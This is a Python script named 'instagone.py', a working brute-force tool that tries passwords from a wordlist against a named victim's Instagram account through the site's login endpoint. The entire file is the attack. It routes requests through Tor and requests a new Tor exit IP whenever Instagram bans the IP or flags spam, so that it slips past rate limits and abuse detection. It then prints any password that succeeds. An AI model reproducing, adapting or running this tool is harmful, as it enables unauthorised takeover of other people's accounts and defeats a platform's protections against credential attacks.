import requests, time, sys, json, random
from stem import Signal
from stem.control import Controller
from optparse import OptionParser

banner = """
 _____              _                                     
|_   _|            | |                                    
  | |   _ __   ___ | |_   __ _   __ _   ___   _ __    ___ 
  | |  | '_ \ / __|| __| / _` | / _` | / _ \ | '_ \  / _ |
 _| |_ | | | |\__ \| |_ | (_| || (_| || (_) || | | ||  __/
 \___/ |_| |_||___/ \__| \__,_| \__, | \___/ |_| |_| \___|
                                 __/ |                    
                                |___/                  
\n"""

############### USAGE


def usage():
    print("""\n

    Usage: instagone.py [-u] username [-l] passwordlist

    REQUIRED:
        -------------------------------------
        -u or --username: 
          The username of the victim
        -------------------------------------
        -l or --list: 
          The password list to be used 
        -------------------------------------

    HELP:
        -------------------------------------
        -h or --help:
          Displays this menu
        -------------------------------------
        
    """)
    sys.exit()


class Engine():
  def __init__(self):
    print(f"\nStart time of script is: {time.ctime()}\n")
    ############# Setting up the options for the terminal ##################
    parser = OptionParser()
    parser.set_conflict_handler("resolve")
    parser.add_option("-u", "--username", dest="uname")
    parser.add_option("-h", "--help", dest="help", action="store_true")
    parser.add_option("-l", "--list", dest="passlist")
    (options, args) = parser.parse_args()
    # If the username is set, the help menu cannot be shown (if called at the same time)
    if options.uname:
      options.help = None
    # Run the help menu
    if (options.uname is None) or (options.passlist is None) or (options.help):
      usage()
    ############# variables to be used throughout the code ##################
    self.fetchTime = 60
    self.line = 0
    self.lineMultiplier = 30
    self.KeyError = False
    self.uname = options.uname
    self.passlist = options.passlist
    self.passwordArray = []
    self.LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
    self.HOME_URL = "https://www.instagram.com/"
    self.proxies = {
        "https": "socks5://127.0.0.1:9050",
        "http":  "socks5://127.0.0.1:9050"
    }
    ########################## HEADERS #########################################
    with open("headers.json",) as h:
      self.headers = json.load(h)
    ############# putting all the passwords into an array #########################
    passwordFile = open(self.passlist, "r")
    for line in passwordFile:
      self.passwordArray.append(line.strip())

  ########################### METHODS ########################################  
  # New TOR IP 
  def renew_tor_ip(self):
    timeout = random.randint(5, 15)
    print(f"[*] Timing out for {timeout} seconds")
    time.sleep(timeout)
    with Controller.from_port(port=9051) as controller:
      controller.authenticate()
      controller.signal(Signal.NEWNYM)
      print("[*] New IP is issued")
      time.sleep(1)

  # Deal with a new password
  def passHandling(self):
    self.p = self.passwordArray[self.line]
    print("-"*self.lineMultiplier)
    print(f"Username: {self.uname}")
    print(f"Password: {self.p}")
    print(f"Passwords place: {self.line}")
    print("-"*self.lineMultiplier)
    self.line += 1
    return self.p

  # logging in
  def loginProcedure(self):
    session = requests.Session()
    session.headers.update(self.headers)
    session.headers.update({'X-CSRFToken': "UBhDYWOc7qXMzNPYlrgK0QadlORboNg8"})
    session.proxies = self.proxies
    # login
    str_time = str(int(time.time()))
    PASSWORD = '#PWD_INSTAGRAM_BROWSER:0:' + str_time + ':' + self.p
    login_data = {"username": self.uname, "enc_password": PASSWORD}
    self.loginInfo = session.post(self.LOGIN_URL, data=login_data, allow_redirects=True, timeout=self.fetchTime)
    return self.loginInfo

  # Checking responses
  def getError(self):
    #responses from IG
    self.response = json.loads(self.loginInfo.text)
    #banned IP
    if "message" in self.response:
      if self.response["message"] == "Please wait a few minutes before you try again.":
        print("[!] IP banned by Instagram")
        self.renew_tor_ip()
        self.line -= 1
        return None
      elif self.response["message"] == "feedback_required":
        print("[!] Spam detection has caught the script")
        self.renew_tor_ip()
        self.line -= 1
      #check point
      elif self.response["message"] == "checkpoint_required":
        print(f"""\n
          [+] Password FOUND!

          Password: {self.p}

          Username: {self.uname}      

        Script ended at: {time.ctime()}
        
        \n""")
        sys.exit()
    #bad pass
    elif  "authenticated" in self.response:
      # no pass match
      if self.response["authenticated"] is False:
        print("[-] No match")
      # pass match
      elif self.response["authenticated"] is True:
        print(f"""\n
          [+] Password FOUND!

          Password: {self.p}

          Username: {self.uname}   

        Script ended at: {time.ctime()}   
    
        \n""")
        sys.exit()
    #request error
    elif "error_type" in self.response:
      if self.response["error_type"] == "generic_request_error":
        print("[!] Request error")
        self.renew_tor_ip()

    #ending lines
    print("-"*self.lineMultiplier+"\n")


print(banner)
BRUTER = Engine()
# LOOPING
while True:
  BRUTER.passHandling()
  BRUTER.loginProcedure()
  BRUTER.getError()
